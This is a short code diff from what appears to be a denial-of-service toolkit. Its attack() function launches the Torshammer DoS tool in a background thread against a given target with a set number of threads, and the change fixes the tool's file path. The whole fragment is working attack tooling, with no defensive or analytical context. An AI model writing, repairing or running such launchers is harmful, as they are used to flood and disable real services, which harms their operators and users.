@@ -43,7 +43,7 @@ def attack(target, port, thread=None):
     
     if os.path.exists('dos-tools/torshammer1/torshammer.py'):
         if not thread: thread = 100
-        t = threading.Thread(target=excute, args=(f'python dos-tools/Torshammer1.0/torshammer.py -t {target} -r {thread}&',))
+        t = threading.Thread(target=excute, args=(f'python dos-tools/torshammer1/torshammer.py -t {target} -r {thread}&',))
         t.start()
         
 def stop():
